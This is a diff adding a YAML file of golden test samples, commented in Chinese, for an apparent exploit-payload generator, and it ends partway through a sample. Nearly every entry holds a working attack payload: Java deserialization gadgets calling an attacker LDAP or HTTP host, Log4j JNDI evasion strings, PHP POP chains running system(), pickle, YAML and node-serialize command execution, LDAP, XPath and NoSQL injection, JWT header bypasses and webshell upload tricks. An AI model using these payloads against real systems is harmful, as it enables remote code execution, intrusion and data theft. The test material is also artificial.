@@ -1,0 +1,911 @@
+# 扩充批次的黄金样本：反序列化（Java/PHP/Python/Node）+ 结构化数据类
+# （NoSQL / LDAP / XPath / 原型链 / JWT / 文件上传）。
+#
+# 期望值全部按 body 手推：槽位代入 → 变量替换 → 无绕过 → raw 输出。
+# 几条 PHP 载荷里的 \0 是 PHP 对 private/protected 属性的**真实字节**编码
+# （`\0类名\0属性` / `\0*\0属性`），所以期望值必须写成 YAML 双引号标量——
+# 单引号不处理转义，写出来的是「反斜杠 + 0」两个字节，长度对不上。
+#
+# `syntax` 断言的取值说明：
+#   ok        —— 该内容类型有可靠 parser 且过了（JSON / XML / PHP 序列化）
+#   unchecked —— 本工具没能力判：yaml / raw / xpath / ldap-filter / file-path /
+#                shell-command 没有 parser；PHP 序列化串里出现 r:/R: 引用时
+#                校验器明确说自己没建模（**不是**校验失败）
+# 这两者的区别是刻意的，run_golden 也分开断言。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= Java · Fastjson =================
+
+  - name: Fastjson L 前缀绕过黑名单
+    state:
+      vuln: deser
+      template: deser.java.fastjson.jdbcrowset.bypass
+      vars: {lhost: "10.0.0.1", lport: "1389", name: "exp"}
+      outputs: [raw]
+    expect:
+      payload: "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://10.0.0.1:1389/exp\",\"autoCommit\":true}"
+      syntax: ok
+
+  - name: Fastjson TemplatesImpl 字节码
+    state:
+      vuln: deser
+      template: deser.java.fastjson.templatesimpl
+      vars: {b64: "yv66vgAA"}
+      outputs: [raw]
+    expect:
+      payload: "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAA\"],\"_name\":\"a\",\"_tfactory\":{},\"_outputProperties\":{}}"
+      syntax: ok
+
+  - name: Fastjson 出网探测（DNS）
+    state:
+      vuln: deser
+      template: deser.java.fastjson.dns
+      vars: {domain: "abc.dnslog.cn"}
+      outputs: [raw]
+    expect:
+      payload: "{\"@type\":\"java.net.Inet4Address\",\"val\":\"abc.dnslog.cn\"}"
+      syntax: ok
+
+  # ================= Java · Jackson =================
+
+  - name: Jackson TemplatesImpl
+    state:
+      vuln: deser
+      template: deser.java.jackson.templatesimpl
+      vars: {b64: "yv66vgAA"}
+      outputs: [raw]
+    expect:
+      payload: "[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{\"_bytecodes\":[\"yv66vgAA\"],\"_name\":\"a\",\"_tfactory\":{},\"_outputProperties\":{}}]"
+      syntax: ok
+
+  - name: Jackson 加载远程 Spring 上下文
+    state:
+      vuln: deser
+      template: deser.java.jackson.springboot
+      vars: {lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      payload: "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://10.0.0.1/bean.xml\"]"
+      syntax: ok
+
+  # ================= Java · SnakeYAML =================
+
+  - name: SnakeYAML JdbcRowSetImpl
+    state:
+      vuln: deser
+      template: deser.java.snakeyaml.jdbcrowset
+      vars: {lhost: "10.0.0.1", lport: "1389", name: "exp"}
+      outputs: [raw]
+    expect:
+      # 块标量 |− 不带末尾换行；缩进是 YAML 的一部分，原样保留
+      payload: |-
+        !!com.sun.rowset.JdbcRowSetImpl
+          dataSourceName: "ldap://10.0.0.1:1389/exp"
+          autoCommit: true
+      syntax: unchecked
+
+  - name: SnakeYAML 加载远程 Spring 上下文
+    state:
+      vuln: deser
+      template: deser.java.snakeyaml.spring
+      vars: {lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      payload: '!!org.springframework.context.support.ClassPathXmlApplicationContext ["http://10.0.0.1/bean.xml"]'
+      syntax: unchecked
+
+  # ================= Java · Log4j =================
+
+  - name: Log4j env 取默认值
+    state:
+      vuln: deser
+      template: deser.java.log4j.obfuscate.env
+      vars: {lhost: "10.0.0.1", lport: "1389", name: "exp"}
+      outputs: [raw]
+    expect:
+      # 槽位默认 env-default：${env:X:-j} 在 X 不存在时求值为 j
+      payload: "${${env:X:-j}ndi:${env:X:-l}dap}://10.0.0.1:1389/exp"
+      syntax: unchecked
+
+  - name: Log4j sys 取默认值（非默认槽位取值）
+    state:
+      vuln: deser
+      template: deser.java.log4j.obfuscate.env
+      slots: {style: sys-default}
+      vars: {lhost: "10.0.0.1", lport: "1389", name: "exp"}
+      outputs: [raw]
+    expect:
+      payload: "${${sys:x:-j}ndi:${sys:x:-l}dap}://10.0.0.1:1389/exp"
+      syntax: unchecked
+
+  - name: Log4j upper 套 lower
+    state:
+      vuln: deser
+      template: deser.java.log4j.obfuscate.env
+      slots: {style: upper-nested}
+      vars: {lhost: "10.0.0.1", lport: "1389", name: "exp"}
+      outputs: [raw]
+    expect:
+      # 内层 ${lower:j}ndi 先变成 jndi，外层 upper 再把它变成 JNDI；
+      # 展开后就是 JNDI:LDAP://…，过滤器看到的却是两层 ${}
+      payload: "${upper:${lower:j}ndi}:${upper:${lower:l}dap}://10.0.0.1:1389/exp"
+      syntax: unchecked
+
+  # ================= Java · Spring / XMLDecoder =================
+
+  - name: Spring bean XML（Linux）
+    state:
+      vuln: deser
+      template: deser.java.spring.beanxml
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+        <beans xmlns="http://www.springframework.org/schema/beans"
+               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+               xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+          <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+            <constructor-arg>
+              <list>
+                <value>/bin/sh</value>
+                <value>-c</value>
+                <value>id</value>
+              </list>
+            </constructor-arg>
+          </bean>
+        </beans>
+      syntax: ok
+
+  - name: Spring bean XML（Windows 解释器）
+    state:
+      vuln: deser
+      template: deser.java.spring.beanxml
+      slots: {sh: cmd}
+      vars: {cmd: whoami}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+        <beans xmlns="http://www.springframework.org/schema/beans"
+               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+               xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+          <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+            <constructor-arg>
+              <list>
+                <value>cmd.exe</value>
+                <value>/c</value>
+                <value>whoami</value>
+              </list>
+            </constructor-arg>
+          </bean>
+        </beans>
+      syntax: ok
+
+  - name: XMLDecoder 出网探测
+    state:
+      vuln: deser
+      template: deser.java.xmldecoder.ssrf
+      vars: {lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <java version="1.8.0" class="java.beans.XMLDecoder">
+         <object class="java.net.URL">
+          <string>http://10.0.0.1/</string>
+          <void method="openStream"/>
+         </object>
+        </java>
+      syntax: ok
+
+  # ================= PHP · 公开 POP 链 =================
+  # 这几条的期望值里 \0 是真实字节：PHP 用 `\0类名\0属性` 编码 private、
+  # `\0*\0属性` 编码 protected。所以只能用 YAML 双引号标量写。
+
+  - name: Monolog RCE1（SyslogUdpHandler）
+    state:
+      vuln: deser
+      template: deser.php.pop.monolog.rce1
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      # 7 个属性：handler(r:2 自引用) / bufferSize / buffer / level /
+      # initialized / bufferLimit / processors=['current','system']
+      payload: "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"\0*\0socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\0*\0handler\";r:2;s:13:\"\0*\0bufferSize\";i:-1;s:9:\"\0*\0buffer\";a:1:{i:0;a:2:{i:0;s:2:\"id\";s:5:\"level\";N;}}s:8:\"\0*\0level\";N;s:14:\"\0*\0initialized\";b:1;s:14:\"\0*\0bufferLimit\";i:-1;s:13:\"\0*\0processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}"
+      # BufferHandler 的 handler 属性 r:2 指回自己（上一层那个对象）。
+      # 引用现在**有校验器了**——校验器独立实现了 PHP 那份编号规则并核对了指向
+      syntax: ok
+
+  - name: Guzzle FileCookieJar 写文件（FW1）
+    state:
+      vuln: deser
+      template: deser.php.pop.guzzle.fw1
+      vars: {file: "a.php", cmd: "id"}
+      outputs: [raw]
+    expect:
+      # FileCookieJar 4 个属性：自己的 filename / storeSessionCookies，
+      # 父类 CookieJar 的 cookies / strictMode——后两个的 mangled 名里是 CookieJar
+      payload: "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":4:{s:41:\"\0GuzzleHttp\\Cookie\\FileCookieJar\0filename\";s:5:\"a.php\";s:52:\"\0GuzzleHttp\\Cookie\\FileCookieJar\0storeSessionCookies\";b:1;s:36:\"\0GuzzleHttp\\Cookie\\CookieJar\0cookies\";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"\0GuzzleHttp\\Cookie\\SetCookie\0data\";a:3:{s:7:\"Expires\";i:1;s:7:\"Discard\";b:0;s:5:\"Value\";s:2:\"id\";}}}s:39:\"\0GuzzleHttp\\Cookie\\CookieJar\0strictMode\";N;}"
+      syntax: ok
+
+  - name: Guzzle FW1 · 换落点路径
+    state:
+      vuln: deser
+      template: deser.php.pop.guzzle.fw1
+      vars: {file: "/tmp/x.php", cmd: "id"}
+      outputs: [raw]
+    expect:
+      # 只有 filename 的长度前缀变了：/tmp/x.php 是 10 字节
+      payload: "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":4:{s:41:\"\0GuzzleHttp\\Cookie\\FileCookieJar\0filename\";s:10:\"/tmp/x.php\";s:52:\"\0GuzzleHttp\\Cookie\\FileCookieJar\0storeSessionCookies\";b:1;s:36:\"\0GuzzleHttp\\Cookie\\CookieJar\0cookies\";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"\0GuzzleHttp\\Cookie\\SetCookie\0data\";a:3:{s:7:\"Expires\";i:1;s:7:\"Discard\";b:0;s:5:\"Value\";s:2:\"id\";}}}s:39:\"\0GuzzleHttp\\Cookie\\CookieJar\0strictMode\";N;}"
+      syntax: ok
+
+  - name: Laravel PendingBroadcast · Dispatcher
+    state:
+      vuln: deser
+      template: deser.php.pop.laravel.pendingbroadcast
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\0*\0events\";O:28:\"Illuminate\\Events\\Dispatcher\":1:{s:12:\"\0*\0listeners\";a:1:{s:2:\"id\";a:1:{i:0;s:6:\"system\";}}}s:8:\"\0*\0event\";s:2:\"id\";}"
+      syntax: ok
+
+  - name: Laravel PendingBroadcast · Faker（非默认槽位取值）
+    state:
+      vuln: deser
+      template: deser.php.pop.laravel.pendingbroadcast
+      slots: {chain: faker}
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\0*\0events\";O:15:\"Faker\\Generator\":1:{s:13:\"\0*\0formatters\";a:1:{s:8:\"dispatch\";s:6:\"system\";}}s:8:\"\0*\0event\";s:2:\"id\";}"
+      syntax: ok
+
+  - name: ThinkPHP 5.1 反序列化链
+    state:
+      vuln: deser
+      template: deser.php.pop.thinkphp.windows
+      vars: {key: "ethan"}
+      outputs: [raw]
+    expect:
+      # private 属性 data 的 mangled 名是 \0think\Model\0data —— 它来自 Model use 的
+      # trait，用的是「使用 trait 的那个类」；r:9 是出处里原样的自引用编号
+      payload: "O:27:\"think\\process\\pipes\\Windows\":1:{s:34:\"\0think\\process\\pipes\\Windows\0files\";a:1:{i:0;O:17:\"think\\model\\Pivot\":2:{s:9:\"\0*\0append\";a:1:{s:5:\"ethan\";a:2:{i:0;s:3:\"dir\";i:1;s:4:\"calc\";}}s:17:\"\0think\\Model\0data\";a:1:{s:5:\"ethan\";O:13:\"think\\Request\":3:{s:7:\"\0*\0hook\";a:1:{s:7:\"visible\";a:2:{i:0;r:9;i:1;s:6:\"isAjax\";}}s:9:\"\0*\0filter\";s:6:\"system\";s:9:\"\0*\0config\";a:1:{s:8:\"var_ajax\";s:0:\"\";}}}}}}"
+      syntax: ok
+
+  - name: ThinkPHP 5.1 · 换键名
+    state:
+      vuln: deser
+      template: deser.php.pop.thinkphp.windows
+      vars: {key: "Ki1ro"}
+      outputs: [raw]
+    expect:
+      # 键名出现两处（append 与 data 的键），两处的长度前缀都是 5
+      payload: "O:27:\"think\\process\\pipes\\Windows\":1:{s:34:\"\0think\\process\\pipes\\Windows\0files\";a:1:{i:0;O:17:\"think\\model\\Pivot\":2:{s:9:\"\0*\0append\";a:1:{s:5:\"Ki1ro\";a:2:{i:0;s:3:\"dir\";i:1;s:4:\"calc\";}}s:17:\"\0think\\Model\0data\";a:1:{s:5:\"Ki1ro\";O:13:\"think\\Request\":3:{s:7:\"\0*\0hook\";a:1:{s:7:\"visible\";a:2:{i:0;r:9;i:1;s:6:\"isAjax\";}}s:9:\"\0*\0filter\";s:6:\"system\";s:9:\"\0*\0config\";a:1:{s:8:\"var_ajax\";s:0:\"\";}}}}}}"
+      syntax: ok
+
+  - name: Yii2 BatchQueryResult 链
+    state:
+      vuln: deser
+      template: deser.php.pop.yii2.batchquery
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      # Connection 的 pdo/dsn、ColumnSchemaBuilder 的 categoryMap 是 public（裸名），
+      # _dataReader/_cache 是 private（mangled 名带着各自的类），type 是 protected
+      payload: "O:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"\0yii\\db\\BatchQueryResult\0_dataReader\";O:17:\"yii\\db\\Connection\":2:{s:3:\"pdo\";i:1;s:3:\"dsn\";O:26:\"yii\\db\\ColumnSchemaBuilder\":2:{s:7:\"\0*\0type\";s:1:\"x\";s:11:\"categoryMap\";O:22:\"yii\\caching\\ArrayCache\":2:{s:10:\"serializer\";a:1:{i:1;s:6:\"system\";}s:30:\"\0yii\\caching\\ArrayCache\0_cache\";a:1:{s:1:\"x\";a:2:{i:0;s:2:\"id\";i:1;i:0;}}}}}}"
+      syntax: ok
+
+  # ================= PHP · 外层包装（两段式）=================
+
+  - name: PHP 外层包装 · 数组键（带嵌套内层载荷）
+    state:
+      vuln: deser
+      template: deser.php.wrap.array
+      vars: {key: "user"}
+      nest: 'O:4:"User":1:{s:4:"name";s:5:"admin";}'
+      outputs: [raw]
+    expect:
+      # <<payload>> 在「嵌套」这一步被换成 nest（跑在变量替换之后）
+      payload: 'a:1:{s:4:"user";O:4:"User":1:{s:4:"name";s:5:"admin";}}'
+      syntax: ok
+
+  - name: PHP 外层包装 · 数组键（没给嵌套载荷，占位符原样保留）
+    state:
+      vuln: deser
+      template: deser.php.wrap.array
+      vars: {key: "user"}
+      outputs: [raw]
+    expect:
+      # 契约 3：没填就原样留着，产出明显不可用的串（不猜、不吐半截）
+      payload: 'a:1:{s:4:"user";<<payload>>}'
+
+  - name: PHP 外层包装 · 对象属性（带嵌套内层载荷）
+    state:
+      vuln: deser
+      template: deser.php.wrap.object
+      vars: {cls: "App\\Cache", prop: "socket"}
+      nest: 'O:10:"SoapClient":1:{s:3:"uri";s:8:"http://x";}'
+      outputs: [raw]
+    expect:
+      # 类名 App\Cache 是 9 字节、属性名 socket 是 6 字节
+      payload: "O:9:\"App\\Cache\":1:{s:6:\"socket\";O:10:\"SoapClient\":1:{s:3:\"uri\";s:8:\"http://x\";}}"
+      syntax: ok
+
+  # ================= Python =================
+
+  - name: pickle 协议 0 · V 操作码
+    state:
+      vuln: deser
+      template: deser.python.pickle.proto0.unicode
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      # V 读到行尾为止，所以载荷里一个引号都没有
+      payload: |-
+        cos
+        system
+        (Vid
+        tR.
+
+  - name: pickle 协议 0 · os.popen
+    state:
+      vuln: deser
+      template: deser.python.pickle.proto0.popen
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        cos
+        popen
+        (Vid
+        tR.
+
+  - name: pickle 协议 0 · Python 2 模块名
+    state:
+      vuln: deser
+      template: deser.python.pickle.proto0.py2
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        c__builtin__
+        eval
+        (S'__import__("os").popen("id").read()'
+        tR.
+
+  - name: yaml.load · subprocess 走向
+    state:
+      vuln: deser
+      template: deser.python.yaml.unsafe_load.subprocess
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      # <<shell>> 是内置变量，默认 bash
+      payload: '!!python/object/apply:subprocess.check_output [["bash", "-c", "id"]]'
+      syntax: unchecked
+
+  - name: yaml.load · subprocess（带参数的命令）
+    state:
+      vuln: deser
+      template: deser.python.yaml.unsafe_load.subprocess
+      vars: {cmd: "cat /etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: '!!python/object/apply:subprocess.check_output [["bash", "-c", "cat /etc/passwd"]]'
+      syntax: unchecked
+
+  # ================= Node =================
+
+  - name: node-serialize 裸表达式
+    state:
+      vuln: deser
+      template: deser.node.serialize.expr
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: "{\"rce\":\"_$$ND_FUNC$$_process.mainModule.require('child_process').execSync('id').toString()\"}"
+      syntax: ok
+
+  - name: node-serialize 载荷嵌在子对象里
+    state:
+      vuln: deser
+      template: deser.node.serialize.nested
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: "{\"data\":{\"data\":\"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()\"}}"
+      syntax: ok
+
+  - name: node-serialize 嵌套 · 换个键名
+    state:
+      vuln: deser
+      template: deser.node.serialize.nested
+      slots: {key: config}
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: "{\"config\":{\"config\":\"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()\"}}"
+      syntax: ok
+
+  - name: funcster 标记与沙箱
+    state:
+      vuln: deser
+      template: deser.node.funcster.deep
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: "{\"rce\":{\"__js_function\":\"function(){return this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}\"}}"
+      syntax: ok
+
+  # ================= NoSQL · 聚合管道 =================
+
+  - name: MongoDB 聚合 $function
+    state:
+      vuln: nosql
+      template: nosql.mongodb.aggregate.function
+      outputs: [raw]
+    expect:
+      payload: '{"$match":{"$expr":{"$function":{"body":"function(){ return true; }","args":[],"lang":"js"}}}}'
+      syntax: ok
+
+  - name: MongoDB 聚合 $function 时间盲注
+    state:
+      vuln: nosql
+      template: nosql.mongodb.aggregate.function.sleep
+      outputs: [raw]
+    expect:
+      # `-d<<<ms>>`：前两个 < 是字面量小于号，后两个是占位符边界
+      payload: '{"$match":{"$expr":{"$function":{"body":"function(){ var d = new Date(); while (new Date() - d <5000) {} return true; }","args":[],"lang":"js"}}}}'
+      syntax: ok
+
+  - name: MongoDB 聚合 $function 时间盲注 · 换阈值
+    state:
+      vuln: nosql
+      template: nosql.mongodb.aggregate.function.sleep
+      slots: {ms: "10000"}
+      outputs: [raw]
+    expect:
+      payload: '{"$match":{"$expr":{"$function":{"body":"function(){ var d = new Date(); while (new Date() - d <10000) {} return true; }","args":[],"lang":"js"}}}}'
+      syntax: ok
+
+  - name: MongoDB 聚合 $expr 引用字段
+    state:
+      vuln: nosql
+      template: nosql.mongodb.aggregate.expr.field
+      outputs: [raw]
+    expect:
+      # 表达式里的 $password 引用的是文档自己的字段，所以「等于自己」恒真
+      payload: '{"$expr":{"$eq":["$password","$password"]}}'
+      syntax: ok
+
+  - name: MongoDB 聚合 $expr 引用字段 · 换字段名
+    state:
+      vuln: nosql
+      template: nosql.mongodb.aggregate.expr.field
+      slots: {pf: pwd}
+      outputs: [raw]
+    expect:
+      payload: '{"$expr":{"$eq":["$pwd","$pwd"]}}'
+      syntax: ok
+
+  - name: MongoDB mapReduce 注入
+    state:
+      vuln: nosql
+      template: nosql.mongodb.mapreduce
+      outputs: [raw]
+    expect:
+      payload: '{"map":"function(){ emit(1, 1); }","reduce":"function(k, v){ return v; }","out":{"inline":1}}'
+      syntax: ok
+
+  # ================= LDAP · AD 与过滤器变形 =================
+
+  - name: LDAP AD 按位匹配 userAccountControl
+    state:
+      vuln: ldap
+      template: ldap.generic.ad.bitmask
+      outputs: [raw]
+    expect:
+      # 默认 v=32（PASSWD_NOTREQD）——这个标志置位的账号可以空密码登录
+      payload: "*)(userAccountControl:1.2.840.113556.1.4.803:=32)(|(userAccountControl=*"
+
+  - name: LDAP AD 按位匹配 · 禁用账号
+    state:
+      vuln: ldap
+      template: ldap.generic.ad.bitmask
+      slots: {v: "2"}
+      outputs: [raw]
+    expect:
+      payload: "*)(userAccountControl:1.2.840.113556.1.4.803:=2)(|(userAccountControl=*"
+
+  - name: LDAP AD 递归查组成员
+    state:
+      vuln: ldap
+      template: ldap.generic.ad.memberof
+      vars: {name: "Domain Admins", domain: "corp"}
+      outputs: [raw]
+    expect:
+      payload: "*)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local)(|(sAMAccountName=*"
+
+  - name: LDAP AD 递归查组成员 · 换组与域名
+    state:
+      vuln: ldap
+      template: ldap.generic.ad.memberof
+      vars: {name: "Enterprise Admins", domain: "example"}
+      outputs: [raw]
+    expect:
+      payload: "*)(memberOf:1.2.840.113556.1.4.1941:=CN=Enterprise Admins,CN=Users,DC=example,DC=local)(|(sAMAccountName=*"
+
+  - name: LDAP 按 objectClass 枚举
+    state:
+      vuln: ldap
+      template: ldap.generic.enum.objectclass
+      outputs: [raw]
+    expect:
+      payload: "*)(objectClass=user*"
+
+  - name: LDAP 按 objectClass 枚举 · 机器账号
+    state:
+      vuln: ldap
+      template: ldap.generic.enum.objectclass
+      slots: {v: computer}
+      outputs: [raw]
+    expect:
+      payload: "*)(objectClass=computer*"
+
+  - name: LDAP 与运算过滤器
+    state:
+      vuln: ldap
+      template: ldap.generic.filter.and
+      outputs: [raw]
+    expect:
+      payload: "(&(uid=*)(objectClass=*))"
+
+  - name: LDAP 与运算过滤器 · 换属性
+    state:
+      vuln: ldap
+      template: ldap.generic.filter.and
+      slots: {attr: sAMAccountName}
+      outputs: [raw]
+    expect:
+      payload: "(&(sAMAccountName=*)(objectClass=*))"
+
+  # ================= XPath =================
+
+  - name: XPath 盲注 · contains 前缀确认
+    state:
+      vuln: xpath
+      template: xpath.generic.blind.contains
+      vars: {prefix: adm}
+      outputs: [raw]
+    expect:
+      payload: "' or contains(//user[1]/password,'adm') or '1'='2"
+
+  - name: XPath 盲注 · contains 换个前缀
+    state:
+      vuln: xpath
+      template: xpath.generic.blind.contains
+      vars: {prefix: "admin"}
+      outputs: [raw]
+    expect:
+      payload: "' or contains(//user[1]/password,'admin') or '1'='2"
+
+  - name: XPath 盲注 · translate 归一大小写
+    state:
+      vuln: xpath
+      template: xpath.generic.blind.translate
+      vars: {value: "admin"}
+      outputs: [raw]
+    expect:
+      payload: "' or translate(//user[1]/password,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz')='admin' or '1'='2"
+
+  - name: XPath 盲注 · 默认命名空间用 local-name
+    state:
+      vuln: xpath
+      template: xpath.generic.namespace.localname
+      vars: {ch: a}
+      outputs: [raw]
+    expect:
+      payload: "' or //*[local-name()='user'][1]/password='a' or '1'='2"
+
+  - name: XPath document() 读外部文档
+    state:
+      vuln: xpath
+      template: xpath.generic.document
+      vars: {target: "file:///etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "' or string-length(document('file:///etc/passwd'))>0 or '1'='2"
+
+  # ================= 原型链污染 =================
+
+  - name: 原型链 · __proto__ Unicode 转义
+    state:
+      vuln: proto
+      template: proto.generic.json.proto.unicode
+      vars: {prop: polluted, value: "yes"}
+      outputs: [raw]
+    expect:
+      # 这里是**字面量的反斜杠 u**（JSON 解码后才是下划线），所以期望值里写 \\
+      payload: "{\"\\u005f\\u005fproto\\u005f\\u005f\":{\"polluted\":\"yes\"}}"
+      syntax: ok
+
+  - name: 原型链 · constructor 转义（非默认槽位取值）
+    state:
+      vuln: proto
+      template: proto.generic.json.proto.unicode
+      slots: {key: ctor}
+      vars: {prop: polluted, value: "yes"}
+      outputs: [raw]
+    expect:
+      payload: "{\"\\u0063onstructor\":{\"polluted\":\"yes\"}}"
+      syntax: ok
+
+  - name: 原型链 · Node shell + input
+    state:
+      vuln: proto
+      template: proto.generic.json.node.shellinput
+      vars: {command: "id"}
+      outputs: [raw]
+    expect:
+      payload: "{\"__proto__\":{\"shell\":\"node\",\"input\":\"require('child_process').execSync('id').toString()\"}}"
+      syntax: ok
+
+  - name: 原型链 · 外层包装成数组
+    state:
+      vuln: proto
+      template: proto.generic.json.wrap.array
+      nest: '{"__proto__":{"polluted":"yes"}}'
+      outputs: [raw]
+    expect:
+      payload: '[{"__proto__":{"polluted":"yes"}}]'
+      syntax: ok
+
+  # ================= JWT =================
+
+  - name: JWT alg 变形 · ES256
+    state:
+      vuln: jwt
+      template: jwt.generic.alg.variants
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"ES256","typ":"JWT"}'
+      syntax: ok
+
+  - name: JWT alg 变形 · 尾随空格
+    state:
+      vuln: jwt
+      template: jwt.generic.alg.variants
+      slots: {alg: trailing}
+      outputs: [raw]
+    expect:
+      # 尾部那个空格是这条载荷的全部意义，别当成笔误删掉
+      payload: '{"alg":"HS256 ","typ":"JWT"}'
+      syntax: ok
+
+  - name: JWT jku 白名单绕过 · @ 截断
+    state:
+      vuln: jwt
+      template: jwt.generic.jku.allowlist
+      vars: {kid: "abc", lhost: "10.0.0.1", trusted: "target.com"}
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"RS256","typ":"JWT","kid":"abc","jku":"https://target.com@10.0.0.1/jwks.json"}'
+      syntax: ok
+
+  - name: JWT jku 白名单绕过 · query 里放域名
+    state:
+      vuln: jwt
+      template: jwt.generic.jku.allowlist
+      slots: {form: query}
+      vars: {kid: "abc", lhost: "10.0.0.1", trusted: "target.com"}
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"RS256","typ":"JWT","kid":"abc","jku":"https://10.0.0.1/jwks.json?u=target.com"}'
+      syntax: ok
+
+  - name: JWT kid 穿越 · 层级可调
+    state:
+      vuln: jwt
+      template: jwt.generic.kid.traversal.depth
+      vars: {target: "dev/null"}
+      outputs: [raw]
+    expect:
+      # <<rep(6,form.seq)>>，form.seq 取默认的 ../ → 六层共 18 个字符
+      payload: '{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}'
+      syntax: ok
+
+  - name: JWT kid 穿越 · 三层 + URL 编码
+    state:
+      vuln: jwt
+      template: jwt.generic.kid.traversal.depth
+      slots: {depth: "3", form: enc}
+      vars: {target: "dev/null"}
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"HS256","typ":"JWT","kid":"..%2f..%2f..%2fdev/null"}'
+      syntax: ok
+
+  - name: JWT x5c 头自带证书链
+    state:
+      vuln: jwt
+      template: jwt.generic.x5c.header
+      vars: {kid: "abc", b64: "MIIC"}
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"RS256","typ":"JWT","kid":"abc","x5c":["MIIC"]}'
+      syntax: ok
+
+  # ================= 文件上传 =================
+
+  - name: .htaccess · auto_prepend_file
+    state:
+      vuln: upload
+      template: upload.generic.htaccess.directives
+      vars: {file: "shell.jpg", ext: ".jpg"}
+      outputs: [raw]
+    expect:
+      payload: "php_value auto_prepend_file shell.jpg"
+
+  - name: .htaccess · SetHandler（非默认槽位取值）
+    state:
+      vuln: upload
+      template: upload.generic.htaccess.directives
+      slots: {code: handler}
+      vars: {file: "shell.jpg", ext: ".jpg"}
+      outputs: [raw]
+    expect:
+      # 这条不引用 file / ext，所以那两个变量填了也不进载荷
+      payload: "SetHandler application/x-httpd-php"
+
+  - name: .htaccess · AddHandler 指定后缀
+    state:
+      vuln: upload
+      template: upload.generic.htaccess.directives
+      slots: {code: addhandler}
+      vars: {file: "shell.jpg", ext: ".jpg"}
+      outputs: [raw]
+    expect:
+      payload: "AddHandler application/x-httpd-php .jpg"
+
+  - name: .user.ini 打开上传进度写会话
+    state:
+      vuln: upload
+      template: upload.generic.userini.upload_progress
+      outputs: [raw]
+    expect:
+      payload: |-
+        session.upload_progress.enabled=On
+        session.upload_progress.cleanup=Off
+        session.upload_progress.name=PHP_SESSION_UPLOAD_PROGRESS
+
+  - name: 短标签绕过内容检查
+    state:
+      vuln: upload
+      template: upload.generic.content.short_tag
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: "<?= system('id'); ?>"
+
+  - name: 反引号（不写函数名）
+    state:
+      vuln: upload
+      template: upload.generic.content.short_tag
+      slots: {style: backtick}
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: "<?= `id` ?>"
+
+  - name: script 标签（PHP 5.x）
+    state:
+      vuln: upload
+      template: upload.generic.content.short_tag
+      slots: {style: script_tag}
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      # <script language="php"> 在 PHP 7 里被删掉了，只有 5.x 目标可用
+      payload: "<script language=\"php\">system('id');</script>"
+
+  - name: 分号截断（IIS 文件名校验差异）
+    state:
+      vuln: upload
+      template: upload.generic.filename.server_parse
+      vars: {name: "shell"}
+      outputs: [raw]
+    expect:
+      payload: "shell.php;.jpg"
+
+  - name: 空字节截断
+    state:
+      vuln: upload
+      template: upload.generic.filename.server_parse
+      slots: {trick: "null"}
+      vars: {name: "shell"}
+      outputs: [raw]
